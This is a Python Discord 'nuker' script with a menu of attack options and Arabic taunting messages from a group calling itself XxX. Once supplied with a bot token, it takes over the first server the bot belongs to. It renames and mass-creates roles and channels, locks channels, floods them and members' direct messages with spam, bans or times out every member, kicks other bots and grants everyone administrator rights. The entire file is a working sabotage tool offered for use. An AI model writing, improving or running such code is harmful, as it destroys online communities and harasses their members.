import discord
import asyncio
from discord.ext import commands
import os

# شعار الأداة بصيغة جبارة
LOGO = """
  ███████╗███████╗███████╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
  ╚══███╔╝╚════██║██╔════╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
    ███╔╝     ██╔╝█████╗      ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
   ███╔╝     ██╔╝ ██╔══╝      ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
  ███████╗  ██╔╝  ██║         ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
  ╚══════╝  ╚═╝   ╚═╝         ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
"""

MESSAGE_CONTENT = """**تم جحفلتكم ي سبايك من قبل قروب / XxX 
ذا مصير اي مستزحف يفكر يسطى على احد
او مصير اي مبتزين عيال حرام يبنزون الاوادم
وذي نهاية الكلام ختفووو بنعال قروبي ي جدد**

https://discord.gg/qb3FGfp4d"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

async def start_attack(token, choice):
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix=".", intents=intents)

    @bot.event
    async def on_ready():
        print(f" [+] Connected to: {bot.user}")
        guild = bot.guilds[0] # يأخذ أول سيرفر يتواجد فيه البوت

        # --- تعريف المهام (Tasks) لضمان السرعة القصوى ---
        
        async def roles_nuke():
            for role in guild.roles:
                try: await role.edit(name="#KILLED BY XxX.")
                except: pass
            while True:
                try: await guild.create_role(name="#KILLED BY XxX.")
                except: break

        async def channels_nuke():
            for channel in guild.channels:
                try:
                    await channel.edit(name="BN3AL-XxX-6666-Group")
                    overwrites = {guild.default_role: discord.PermissionOverwrite(send_messages=False)}
                    await channel.set_permissions(guild.default_role, overwrite=overwrites)
                except: pass
            while True:
                try:
                    new_ch = await guild.create_text_channel(name="BN3AL-XxX-6666-Group")
                    overwrites = {guild.default_role: discord.PermissionOverwrite(send_messages=False)}
                    await new_ch.set_permissions(guild.default_role, overwrite=overwrites)
                except: break

        async def spam_webhook():
            while True:
                for channel in guild.text_channels:
                    try:
                        hook = await channel.create_webhook(name="XxX Group")
                        await hook.send(MESSAGE_CONTENT)
                    except: pass
                await asyncio.sleep(0.8)

        # --- منطق اختيار الوظيفة ---
        if choice == "1": # FULL NUKE
            await asyncio.gather(roles_nuke(), channels_nuke(), spam_webhook())
        elif choice == "2":
            await roles_nuke()
        elif choice == "3":
            await channels_nuke()
        elif choice == "4":
            await spam_webhook()
        elif choice == "5": # SPAM DM
            for member in guild.members:
                try: [await member.send(f"# السيرفر تجحفل | قروب XxX يرسل تحياته\nhttps://discord.gg/qb3FGfp4d") for _ in range(5)]
                except: pass
        elif choice == "6": # KICK BOTS
            for member in guild.members:
                if member.bot and member.id != bot.user.id:
                    try: await member.kick()
                    except: pass
        elif choice == "7": # TIMEOUT ALL
            import datetime
            duration = datetime.timedelta(days=7)
            for member in guild.members:
                try: await member.timeout(duration, reason="بنعالات قروب XxX")
                except: pass
        elif choice == "8": # BAN ALL
            for member in guild.members:
                try: await member.ban(reason="ختفووو برا يلا | XxX")
                except: pass
        elif choice == "9": # ADMIN ALL
            role = await guild.create_role(name="Admin XxX", permissions=discord.Permissions.all())
            for member in guild.members:
                try: await member.add_roles(role)
                except: pass
        elif choice == "10": # SPAM EMBED
            title = input("Enter Title: ")
            desc = input("Enter Description: ")
            embed = discord.Embed(title=title, description=desc)
            while True:
                for channel in guild.text_channels:
                    try: await channel.send(embed=embed)
                    except: pass

    try:
        await bot.start(token)
    except:
        print(" [!] Invalid Token!")

def menu():
    clear_screen()
    print(f"\033[31m{LOGO}\033[0m")
    options = [
        "FULL NUKE", "ROLES NUKE", "CHANNEL NUKE", "SPAM WEBHOOK", "SPAM DM",
        "KICK BOTS", "TIMEOUT ALL", "BAN ALL", "ADMIN ALL", "SPAM EMBED"
    ]
    for i, opt in enumerate(options, 1):
        print(f" [{i}] {opt}")
    
    choice = input("\n [?] Select Option: ")
    token = input(" [>] Enter Bot Token: ")
    
    asyncio.run(start_attack(token, choice))

if __name__ == "__main__":
    menu()
